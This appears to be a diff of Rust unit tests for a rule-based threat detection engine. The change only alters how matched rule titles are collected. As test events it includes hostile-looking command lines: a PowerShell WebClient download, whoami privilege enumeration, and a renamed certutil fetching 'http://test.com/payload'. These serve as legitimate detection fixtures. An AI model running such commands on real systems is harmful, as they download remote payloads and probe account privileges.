@@ -4133,7 +4133,7 @@ detection:
                 "powershell.exe -Command (New-Object Net.WebClient).download()".to_string(),
             );
             let m1 = engine.evaluate_event(&event1);
-            let titles1: Vec<&str> = m1.iter().map(|m| m.rule_title.as_str()).collect();
+            let titles1: Vec<&str> = m1.iter().map(|m| m.rule_title).collect();
             assert_eq!(titles1, vec!["Powershell Rule"]);
 
             // Event 2: cmd.exe with 'whoami' and 'admin' -> rule_cmd and rule_multi should match
@@ -4149,7 +4149,7 @@ detection:
                 "cmd.exe /c whoami /groups admin".to_string(),
             );
             let m2 = engine.evaluate_event(&event2);
-            let mut titles2: Vec<&str> = m2.iter().map(|m| m.rule_title.as_str()).collect();
+            let mut titles2: Vec<&str> = m2.iter().map(|m| m.rule_title).collect();
             titles2.sort_unstable();
             assert_eq!(titles2, vec!["Cmd Rule", "Multi-Binary Rule"]);
 
@@ -4166,7 +4166,7 @@ detection:
                 "chrome.exe --malicious-flag".to_string(),
             );
             let m3 = engine.evaluate_event(&event3);
-            let titles3: Vec<&str> = m3.iter().map(|m| m.rule_title.as_str()).collect();
+            let titles3: Vec<&str> = m3.iter().map(|m| m.rule_title).collect();
             assert_eq!(titles3, vec!["Unconstrained Rule"]);
 
             // Event 4: renamed binary with OriginalFileName = certutil.exe
@@ -4180,7 +4180,7 @@ detection:
                 "evasion.exe -urlcache -split -f http://test.com/payload".to_string(),
             );
             let m4 = engine.evaluate_event(&event4);
-            let titles4: Vec<&str> = m4.iter().map(|m| m.rule_title.as_str()).collect();
+            let titles4: Vec<&str> = m4.iter().map(|m| m.rule_title).collect();
             assert_eq!(titles4, vec!["OriginalFileName Rule"]);
 
             // Event 5: Unix path with forward slash
@@ -4203,7 +4203,7 @@ detection:
             event5.insert("Image".to_string(), "/usr/bin/sh".to_string());
             event5.insert("CommandLine".to_string(), "sh whoami".to_string());
             let m5 = engine.evaluate_event(&event5);
-            let titles5: Vec<&str> = m5.iter().map(|m| m.rule_title.as_str()).collect();
+            let titles5: Vec<&str> = m5.iter().map(|m| m.rule_title).collect();
             assert_eq!(titles5, vec!["Sh Rule"]);
         }
     }
